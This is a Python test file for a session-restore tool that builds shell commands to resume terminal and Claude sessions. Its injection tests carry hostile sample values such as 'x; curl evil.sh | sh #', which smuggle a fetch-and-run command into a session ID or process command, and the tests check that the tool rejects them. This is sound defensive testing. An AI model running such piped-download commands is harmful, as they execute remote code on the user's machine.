"""Restore commands are typed into a live shell, so what goes into them matters."""

import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from runner import run

from agent_tabs import adapters, procs

UUID = "f73c45c1-6f0b-41be-8641-563cddd433f0"


def proc(command: str, pid: int = 4242) -> procs.Proc:
    return procs.Proc(pid, 1, "ttys001", command)


def with_pointer(payload: dict, pid: int = 4242):
    """Write a real ~/.claude/sessions/<pid>.json and resolve against it."""
    with tempfile.TemporaryDirectory() as tmp:
        original = adapters.CLAUDE_SESSIONS
        adapters.CLAUDE_SESSIONS = Path(tmp)
        (Path(tmp) / f"{pid}.json").write_text(json.dumps(payload))
        try:
            return adapters.resolve_claude(proc("claude", pid), None)
        finally:
            adapters.CLAUDE_SESSIONS = original


def test_claude_pointer_supplies_id_and_cwd():
    got = with_pointer({"sessionId": UUID, "cwd": "/repo/worktree"})
    assert got["restore"] == f"cd /repo/worktree && claude --resume {UUID}"
    assert got["warning"] is None


def test_claude_quotes_a_directory_with_spaces():
    got = with_pointer({"sessionId": UUID, "cwd": "/repo/my project"})
    assert got["restore"] == f"cd '/repo/my project' && claude --resume {UUID}"


def test_non_uuid_session_id_from_the_pointer_is_rejected():
    # The pointer file is not ours; a crafted value would otherwise be typed
    # into a shell verbatim.
    got = with_pointer({"sessionId": "x; curl evil.sh | sh #", "cwd": "/repo"})
    assert got["session_id"] is None
    assert "curl" not in got["restore"], got["restore"]
    assert got["restore"] == "cd /repo && claude"


def test_missing_cwd_is_flagged_not_silently_dropped():
    # Resume is cwd-scoped, so a command with no `cd` looks right and fails.
    got = with_pointer({"sessionId": UUID})
    assert got["restore"] == f"claude --resume {UUID}"
    assert got["warning"] and "working directory unknown" in got["warning"]


def test_plain_command_is_replayed():
    got = adapters.resolve_command(proc("ssh prod-box"), "/home/me")
    assert got["restore"] == "cd /home/me && ssh prod-box"
    assert got["warning"] is None


def test_command_with_shell_syntax_is_not_replayed():
    hostile = "ssh host; curl http://evil/p.sh|sh #"
    got = adapters.resolve_command(proc(hostile), "/home/me")
    assert got["restore"] == "cd /home/me", got["restore"]
    assert "curl" not in got["restore"]
    assert got["warning"] and "shell syntax" in got["warning"]
    # The original is still reported, so the operator can decide for themselves.
    assert hostile in got["warning"]


def test_agent_kinds_derive_from_the_resolver_table():
    # Three copies of this set previously drifted apart; keep them derived.
    assert adapters.AGENT_KINDS == frozenset(adapters.AGENT_RESOLVERS)
    for kind in adapters.AGENT_KINDS:
        assert kind in adapters.ALL_KINDS


if __name__ == "__main__":
    raise SystemExit(run(globals()))
